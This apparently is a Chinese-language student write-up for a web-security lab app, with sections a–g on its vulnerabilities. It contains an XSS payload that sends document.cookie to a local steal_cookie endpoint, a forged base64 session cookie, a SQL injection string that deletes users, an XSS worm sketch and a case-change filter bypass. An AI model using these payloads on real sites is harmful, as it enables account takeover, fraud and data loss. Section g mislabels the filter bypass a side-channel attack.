# CyberSecurity

## a.txt
输入未知的user name xxx，显示出`xxx does not exist`
注意到`router.js`中相关代码如下：
```javascript
    if(result) { // if user exists
      render(req, res, next, 'profile/view', 'View Profile', false, result);
    }
    else { // user does not exist
      render(req, res, next, 'profile/view', 'View Profile', `${req.query.username} does not exist!`, req.session.account);
    }
```
可以看到，当用户不存在时，会将`req.query.username`直接拼接到返回的html中，这里存在XSS漏洞。
考虑在此注入一段js代码，如下：
```html
<p hidden>
    <script>
        var x = new XMLHttpRequest();
        x.open("GET", "http://localhost:3000/steal_cookie?cookie="+(document.cookie));
        x.send()
    </script>
```
这段代码会向`http://localhost:3000/steal_cookie`发送一个GET请求，其中包含当前页面的cookie信息。

## b.html
见`b.pdf`

## c.txt
在`router.js`中，有如下代码：
```javascript
  if(receiver) { // if user exists
    const amount = parseInt(req.body.quantity);
    if(Number.isNaN(amount) || amount > req.session.account.bitbars || amount < 1) {
      render(req, res, next, 'transfer/form', 'Transfer Bitbars', 'Invalid transfer amount!', {receiver:null, amount:null});
      return;
    }

    req.session.account.bitbars -= amount;
    query = `UPDATE Users SET bitbars = "${req.session.account.bitbars}" WHERE username == "${req.session.account.username}";`;
    await db.exec(query);
    const receiverNewBal = receiver.bitbars + amount;
    query = `UPDATE Users SET bitbars = "${receiverNewBal}" WHERE username == "${receiver.username}";`;
    await db.exec(query);
    render(req, res, next, 'transfer/success', 'Transfer Complete', false, {receiver, amount});
  }
```
注意到转账更新是直接将`session cookie`中的相关数据更新到数据库中，考虑直接对`cookie`做改动。

登录`user1`，在控制台中查看`document.cookie`，得到
```
"session=eyJsb2dnZWRJbiI6dHJ1ZSwiYWNjb3VudCI6eyJ1c2VybmFtZSI6InVzZXIxIiwiaGFzaGVkUGFzc3dvcmQiOiI4MTQ2ZmYzM2U4MTVlMWEwOGVhZTJiNDczYmYyY2NhMTU5NTgyZTQzNGM1MjUyNGMzMzI1ZjA2ZThjMmI4MGQ5Iiwic2FsdCI6IjEzMzciLCJwcm9maWxlIjoiIiwiYml0YmFycyI6MjAwfX0="
```

使用base64解码：
`{"loggedIn":true,"account":{"username":"user1","hashedPassword":"8146ff33e815e1a08eae2b473bf2cca159582e434c52524c3325f06e8c2b80d9","salt":"1337","profile":"","bitbars":200}}`

直接对解码后的cookie修改`username`和`bitbars`字段，再将其base64编码，得到新的cookie即可

## d.txt
和`c.txt`的原理相同，获取`cookie`后，修改`bitbars`字段即可

## e.txt

该题为SQL Injection，我们在`router.js`中找到如下代码：
```javascript
const query = `DELETE FROM Users WHERE username == "${req.session.account.username}";`;
```

没有做任何的过滤，所以可以直接注入SQL语句，删除数据库中的数据。我使用的SQL语句如下：
```
user3" OR username LIKE "user3%";#
```
\#可以将之后的语句全部注释，在删除时就是删除所有以user3开头的用户。

## f.txt

该题是XSS, 我们可以在代码中发现
```javascript
<% if (result.username && result.profile) { %>
    <div id="profile"><%- result.profile %></div>
<% } %>
```
那么profile是要执行的。
所以我们通过通过XSS发送transfer请求进行转账，之后再通过发送set_profile请求将profile复制到查看的用户上，这样就可以实现XSS worm攻击。

## g.txt

本题是侧信道攻击，我们再transfer请求中，可以看到
```javascript
<input type="text" name="destination_username" value="<%= result.receiver %>">
```

由于使用的是<%=>会进行一些filter，经过查阅资料，发现可以改变一些TAG绕过filter，所以我们将img改为imG,script改为scripT，这样就可以绕过filter，将脚本注入到页面中进行登录操作。